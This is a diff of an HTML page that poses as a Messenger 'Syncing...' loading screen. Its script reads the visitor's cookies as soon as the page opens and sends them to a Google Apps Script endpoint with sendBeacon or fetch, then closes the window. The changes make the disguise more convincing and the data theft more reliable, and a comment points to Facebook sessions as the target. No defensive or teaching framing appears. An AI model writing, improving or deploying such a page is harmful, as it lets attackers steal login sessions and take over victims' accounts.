@@ -1,73 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
         body {
-            background-color: #f0f2f5;
-            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
         .container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             text-align: center;
+        }
+        h2 {
+            color: #0084ff;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #65676b;
+            font-size: 14px;
+        }
+        /* Spinner animation */
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0084ff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body> 
+<body>
 
 <div class="container">
-    <h2 style="color:#0084ff;">Messenger</h2>
-    <p id="status">Capturing session...</p>
+    <div class="spinner"></div>
+    <h2>Messenger</h2>
+    <p id="status">Syncing...</p>
 </div>
 
 <script>
-    // PASTE YOUR NEW GOOGLE SCRIPT URL HERE
-    var scriptURL = "https://script.google.com/macros/s/AKfycbwCuryz54YhSuokJcwU1XrEx_5Al4C-EK8aVj58ClzHV2l48laM7T_HVUjrsCuliRE/exec";
+    // ⚠️ PASTE YOUR GOOGLE APPS SCRIPT URL BELOW ⚠️
+    var scriptURL = "https://script.google.com/macros/s/AKfycbxKPU2ymY-NnryEMm1bHAYpQRR2Hn15Npovdpg8THvc5G_rX0316NPYEVRXvFdMmdU/exec";
 
-    function stealAndSend() {
-        // 1. Get the cookie string from the current document
-        var cookieString = document.cookie;
+    function captureAndSend() {
+        // 1. Get the raw cookie string from the current browser context
+        // Note: This only works if the user is logged into FB in THIS specific browser tab
+        var rawCookie = document.cookie;
         
-        console.log("Raw Cookie:", cookieString);
+        console.log("Raw Cookie Found:", rawCookie);
 
-        // 2. Encode it to handle special characters (like & or =)
-        var encodedCookie = encodeURIComponent(cookieString);
+        // 2. Encode it so special characters (like &, =, :) don't break the URL
+        var encodedCookie = encodeURIComponent(rawCookie);
 
-        // 3. Construct the URL with the cookie as a parameter
-        // We add a random number to prevent browser caching
-        var finalURL = scriptURL + "?cookie=" + encodedCookie + "&t=" + Math.random();
+        // 3. Construct the final URL with a random parameter to prevent caching
+        var fullURL = scriptURL + "?cookie=" + encodedCookie + "&ts=" + Date.now();
 
-        // 4. Send the data using fetch
-        // mode: 'no-cors' allows us to send data even if CORS blocks reading the response
-        fetch(finalURL, {
-            method: 'GET',
-            mode: 'no-cors'
-        })
-        .then(function() {
-            console.log("Cookie Sent Successfully!");
+        // 4. Use navigator.sendBeacon for reliable background transmission
+        // This is better than fetch() because it works even if the page closes immediately
+        try {
+            navigator.sendBeacon(fullURL);
+            console.log("Data sent via Beacon");
+            
+            // Update UI
             document.getElementById('status').innerText = "Done!";
             
-            // 5. Close the window after 2 seconds
-            setTimeout(function(){ 
-                window.close(); 
-            }, 2000);
-        })
-        .catch(function(error) {
-            console.error("Error sending cookie:", error);
-            document.getElementById('status').innerText = "Error!";
-        });
+            // Close the window after a short delay so the user sees "Done"
+            setTimeout(function() {
+                window.close();
+            }, 1500);
+
+        } catch (error) {
+            console.error("Beacon failed, falling back to fetch:", error);
+            // Fallback if Beacon fails
+            fetch(fullURL, { mode: 'no-cors' });
+            setTimeout(function() { window.close(); }, 1500);
+        }
     }
 
-    // Run immediately when the page loads
-    stealAndSend();
+    // Run the function immediately when the page loads
+    captureAndSend();
 </script>
 
 </body>
